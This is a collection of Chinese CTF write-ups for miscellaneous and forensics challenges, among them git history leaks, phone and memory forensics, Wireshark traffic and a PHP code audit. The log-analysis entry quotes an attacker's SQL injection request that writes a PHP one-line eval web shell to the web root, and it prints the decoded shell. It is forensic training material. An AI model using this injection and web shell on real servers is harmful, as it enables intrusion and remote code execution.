# CTF WP-MISC
---
## [LitCTF 2023]就当无事发生

https://www.nssctf.cn/problem/3862

* 考点：.git泄露,信息收集
* 工具：github

根据题目提示信息可知只要回溯到之前的某次github提交即有可能获取敏感信息，可以根据git的特性，查看历史commit修改记录，通过搜索找到敏感字符串，即本题flag。

只能说不愧是杂项，这种方式的题第一次见
---
## [2022蓝帽杯]手机取证1(初级)

https://www.nssctf.cn/problem/2443
https://forensics.didctf.com/challenges#%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%81_1-41

* 考点：电子取证
* 工具：盘古石阅读器（题目提供）
* 直接使用题目提供的盘古石阅读器大概苹果测试的文件夹进行搜索即可，可以得到匹配的flag内容（图像分辨率）
  ![1738332888462](../image/README/1738332888462.png)
---
## [2023陇剑杯]Wireshark1_1

https://www.nssctf.cn/problem/6359
https://forensics.didctf.com/challenges#Wireshark1_1-552

* 考点：流量分析
* 工具：wireshark
  使用wireshark查看流量包，可以通过长度和协议类型明显的看到异样的流量，![1738334014307](../image/README/1738334014307.jpg)进一步追踪流并阅读明文内容可知确实为入侵流量，查看目的ip地址即得flag

---
## [2022蓝帽杯]网站取证_2

https://www.nssctf.cn/problem/2452 
https://forensics.didctf.com/challenges#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81_2-52

* 考点：PHP代码审计
* 工具：任意文本查看工具，PHP
通过审计阅读提供的代码源文件，可以发现数据库的登录密码使用了my_encrypt()这个函数，在encrypt.php这个文件中可以找到这个函数的具体内容，其将字符串进行了AES解密后进行base64解密得到明文密码，但是要注意，这里的php环境版本比较低，所以如果php配不好的话就需要手动实现代码中的步骤，我是手动实现，也可以得到结果

![1738335121566](../image/README/1738335121566.jpg)

---
## [OtterCTF 2018]General Info
* 考点：内存取证
* 工具：Volatility（https://github.com/volatilityfoundation/volatility3）
本题考查对于内存取证工具的使用，通过Volatility对vmem文件进行分析，找到PC名和IP即可
---
## [应急响应]welog1

https://forensics.didctf.com/challenges#welog1-703

* 考点：日志分析,PHP审计
* 工具：文本查看工具，base64
分析给出的日志，可以发现在最后的几行中出现了敏感信息`fl4g`,其中一条日志为：
```
192.168.150.1 - - [10/Mar/2023:08:23:05 +0000] "GET /index.php?id=0%27+union+select+1%2C0x223c3f70687020406576616c28245f504f53545b273362393064373564653234386365353562363665386533303837336236303030275d293b3f3e22%2C3%2C4+into+outfile+%22%2Fvar%2Fwww%2Fhtml%2Ftest2.php%22%23 HTTP/1.1" 200 1194 "http://192.168.150.31:9999/index.php?id=0%27+union+select+1%2C0x223c3f70687020406576616c28245f504f53545b273362393064373564653234386365353562363665386533303837336236303030275d293b3f3e22%2C3%2C4+into+outfile+%22%2Fvar%2Fwww%2Fhtml%2Ftest2.php%22--%2B+" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
```
将十六进制的内容写入了`/var/www/html/test2.php`这个文件，对十六进制的字符串进行解码后得得到下面的内容：
![1738479959107](../image/README/1738479959107.jpg)

```bash
"<?php @eval($_POST['3b90d75de248ce55b66e8e30873b6000']);?>"
```
这个是典型的一句话木马，攻击者可以通过`3b90d75de248ce55b66e8e30873b6000`进行连接，即为本题的答案

---
## [NISACTF 2022]midlevel